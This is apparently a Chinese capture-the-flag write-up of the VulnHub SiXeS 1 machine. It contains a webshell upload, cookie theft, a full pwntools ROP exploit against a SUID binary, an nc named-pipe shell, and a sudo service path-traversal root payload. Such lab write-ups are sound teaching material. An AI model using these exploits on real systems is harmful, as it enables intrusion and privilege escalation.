---
title: vulnHub_SiXeS_1
date: 2019-10-20 18:40:53
tags: 
- VulnHub
- 渗透测试
categories: WriteUp
---
# 靶机环境
## 10-24 获得所有flag（6/6）
## 10-20 暂未取得所有flag（4/6）
官网链接：https://www.vulnhub.com/entry/sixes-1,380/
下载地址：https://download.vulnhub.com/sixes/SiXeS-1aa67eae208f9fcc3785c1e622805a35.ova
<!--more-->
# 信息搜集
目标在192.168.56.116上线
![](https://i.loli.net/2019/10/20/4cIo9bnPeLUYQKS.png)
nmap走一轮
```
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-20 19:02 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.116
Host is up (0.00013s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 0        0             233 Oct 03 20:44 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.101
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b2:b1:45:a2:01:2b:10:7e:01:04:c3:5d:4d:43:5d:4d (RSA)
|   256 c2:c3:e2:fa:37:97:b7:32:1a:9d:43:96:f1:72:01:e3 (ECDSA)
|_  256 a9:87:18:d6:a3:a1:ad:7e:85:d0:3f:cf:d7:bd:49:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: SiXeS - Making Team Fortress 2 great again
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
目标开放21，22，80端口，并且21端口的ftp还是存在匿名登录。
# 进行渗透
## ftp
匿名登录进去get一下note，第一个flag到手
![](https://i.loli.net/2019/10/20/ChMQP8IHmkJrSdR.png)
## 80端口
一个web服务
![](https://i.loli.net/2019/10/20/z9Frk1VsKlJ8Eb7.png)
主页上有一个管理员登录的入口，需要用户名密码。
还有contact.php页面可以给网站留言
![](https://i.loli.net/2019/10/20/Z3CvLHatbXRxjFV.png)
用nc打开本机的某个端口接受连接，同时把自己的ip和端口号交上去。远端会用url开头的协议与你通信。
![](https://i.loli.net/2019/10/20/xVwXn1JsD9Eg3Ta.png)
收到通信流量后会发现cookie也带过来了。
下一步修改cookie，访问admin.php就可以看到管理后台。同时页面也给出第二个flag
![](https://i.loli.net/2019/10/20/mZjsuVI7Fbg6qly.png)
## 文件上传
只允许上传图片格式的文件。但是并不是对文件后缀进行检查，而是直接看文件头。随便找一个图片文件，在末尾追加一句话木马，改名成a.php上传。
上传位置可以通过复制网站中其他图片的位置得到，在/img/目录下。
![](https://i.loli.net/2019/10/20/LEvdO1RrU95aNyz.png)
之后写入反弹shell，传入meterpreter生成的shell木马就可以获得一个meterpreter环境。（msf真的香）
![](https://i.loli.net/2019/10/20/UxAklcYSZCzwiEv.png)
之后进入/home文件夹，拿到第三个flag
![](https://i.loli.net/2019/10/20/lVgDGufXq7L8oSd.png)
在config.php里面有sql数据库的明文密码和用户，使用这个登录数据库。
![](https://i.loli.net/2019/10/20/BYnfC25D1qXtwMH.png)
之前生成的shell无法交互式的输入密码，这里再用python生成一个。由于远端的python需要用python3来调用，需要一点小小的修改。
```
python3 -c "import pty;pty.spawn('/bin/bash')"
mysql -u root -p
```
之后得到数据库
![](https://i.loli.net/2019/10/20/ITnk7uVBYsgrCPZ.png)
使用sixes数据库，里面放着第四个flag
![](https://i.loli.net/2019/10/20/ZL7eA49bRVCPcDn.png)
# 后渗透阶段
## 普通用户权限
问了下国外的一个老哥，他给了我一个信息搜集的脚本，可以一键搜集当前服务器上的敏感信息：[LinEnum](https://github.com/rebootuser/LinEnum)
```sh
[00;31m[-] SUID files:[00m
-rwsr-xr-x 1 root root 40152 May 15 21:43 /snap/core/7713/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7713/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7713/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7713/bin/su
-rwsr-xr-x 1 root root 27608 May 15 21:43 /snap/core/7713/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7713/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7713/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7713/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7713/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7713/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jun 10 23:53 /snap/core/7713/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10 20:46 /snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7713/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Aug 30 08:09 /snap/core/7713/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7713/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Aug 23 12:28 /snap/core/7917/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7917/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7917/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7917/bin/su
-rwsr-xr-x 1 root root 27608 Aug 23 12:28 /snap/core/7917/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7917/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7917/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7917/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7917/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7917/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jun 10 23:53 /snap/core/7917/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10 20:46 /snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7917/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Oct  1 10:55 /snap/core/7917/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7917/usr/sbin/pppd
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount
-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28 12:05 /bin/ping
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 18448 Jun 28 12:05 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42992 Jun 10 19:05 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-r-sr-xr-x 1 root root 243896 Sep 20 10:35 /usr/lib/chromium-browser/chrome-sandbox
-rwsr-sr-x 1 root root 105336 Jun  5 07:41 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-r-sr-sr-x 1 webmaster webmaster 17320 Oct  3 20:24 /sbin/notemaker
```
可以看到suid文件里最后有一个属于webmaster的程序，除nx外没有其他防护，拉回本地进行分析。用无敌的ida看一眼，可以发现有一个大洞。
![](https://i.loli.net/2019/10/24/AHvewRZP6rKtciz.png)
栈溢出直接写ropchain，泄露libc基址，然后ret回system搞定。
这里贴上我的exp：
```py
from pwn import *
import sys
if(len(sys.argv)-1):
	p=remote(sys.argv[1],sys.argv[2])
	libc=ELF("./libc.so.6")
else:
	p=process("./notemaker")
	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
offset=0x118
payload='a'*offset
poprdi=0x00000000004014eb
poprsir15=0x00000000004014e9
elf=ELF('./notemaker')
p.recvuntil('>>')
puts_got=elf.got["puts"]
puts_plt=elf.plt['puts']
payload+=p64(poprdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(0x401222)
gdb.attach(p,'bp 0x40136e')
p.sendline(payload)
#p.interactive()
a=p.recvline()[1:-1]
libc_base=u64(a.ljust(8,'\x00'))-libc.symbols["puts"]
sys_addr=libc_base+libc.symbols["system"]
#gdb.attach(p,'bp 0x40136e')
sh_addr=libc_base+next(libc.search("/bin/sh"))
payload='a'*offset
payload+=p64(0x000000000040136F)# ret
payload+=p64(poprdi)
payload+=p64(sh_addr)
payload+=p64(sys_addr)
payload+=p64(0x401222)
p.sendline(payload)
p.interactive()
```
需要注意一点是在Ubuntu下进行函数调用时的栈是16位对齐的，也就是说栈顶地址务必是0x……0的形式，在这里卡了一下午，多亏@0x000c0ded的提醒。
通了以后就可以利用
```sh
mknod /tmp/backpipe p 
notemaker 0</tmp/backpipe | nc -lp 4430 1>/tmp/backpipe
```
把程序挂出来，这两行命令可以规避nc -e不存在的问题。
之后打通就是普通用户权限
## 普通用户持久化
在~/下新建.ssh文件夹，把本机的ssh pub key放到里面的authorized_keys，之后就可以本机ssh免密登录靶机。
## Get root
sudo -l 查看当前可以进行的sudo 命令，发现可以免密执行sudo service。
审计service脚本，发现可以利用类似php文件包含类似的思路来进行目录穿越，执行其他目录下的脚本。
审了我整整两天才发现的洞啊。
![](https://i.loli.net/2019/10/24/TM5GeOqiswzU2hL.png)
这个位置上没有过滤serv ice中的../，直接下一行就exec执行了。构造../../../之类的就可以劫持目录到任意位置。
最后的payload：
```sh
sudo service ..//..//..//home//webmaster//2333  bbbb cccc
```
2333是我最开始生成的meterpreter后门文件。
像之前一样设置msf，就可以看到一个root权限的meterpreter环境弹回来。
## root持久化
和普通用户持久化一样，设置下.ssh文件夹，之后可以ssh免密连接。
![](https://i.loli.net/2019/10/24/t74NHJXY3kgMT6d.png)
# 总结
说实话，我感觉我走的有点偏，这个似乎是想让你用sql注入的方式搞出来的，而不是拿到webshell后登录查询搞出来。
后面我还拿到webmaster的密码对应的md5值，可惜跑遍字典都没能还原出密码。暂时卡在这里。对于提权还没有什么思路。也试过几个cve，可惜都跑不动。常见的sudo错配问题也试过，没有用。
![](https://i.loli.net/2019/10/20/jSB4FxRyJGVhWrH.png)
审计两天service脚本，shell脚本的语法也看了个七七八八。学到了Ubuntu下函数调用时的栈对齐，可以用管道文件绕过阉割-e的nc。
